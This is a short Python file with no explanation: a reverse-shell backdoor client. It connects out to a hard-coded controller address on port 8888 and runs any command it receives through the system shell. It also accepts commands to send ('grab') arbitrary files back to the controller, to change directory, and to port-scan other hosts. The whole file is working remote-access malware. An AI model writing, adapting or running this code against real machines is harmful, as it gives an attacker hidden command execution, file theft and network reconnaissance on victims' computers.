import socket
import subprocess
import os

def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE'.encode())
    else:
        s.send('File not found'.encode())

def scanner(s, ip, ports):
    scan_result = ''
    for port in ports.split(','):
        try:
            sock = socket.socket()
            output = sock.connect_ex((ip, int(port)))
            if output == 0:
                scan_result = scan_result + "[+] Port " + port + " is opened" + "\n"
            else:
                scan_result = scan_result + "[-] Port " + port + " is closed"
        except Exception as e:
            pass
    s.send(scan_result.encode())

def connecting():
    s = socket.socket()
    s.connect(("192.168.162.128",8888))

    while True:
        command = s.recv(1024)

        if 'terminate' in command.decode():
            s.close()
            break

        elif 'grab' in command.decode():
            grab, path = command.decode().split("*")
            try:
                transfer(s, path)
            except Exception as e:
                s.send(str(e).encode())
                pass

        elif 'cd' in command.decode():
            code, directory = command.decode().split('*')
            try:
                os.chdir(directory)
                s.send(('[+] CWD is ' + os.getcwd()).encode())
            except Exception as e:
                s.send(('[-] ' + str(e)).encode())

        elif 'scan' in command.decode():
            command = command[5:].decode()
            ip, ports = command.split(':')
            scanner(s, ip, ports)

        else:
            CMD = subprocess.Popen(command.decode(), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())

def main():
    connecting()
main()
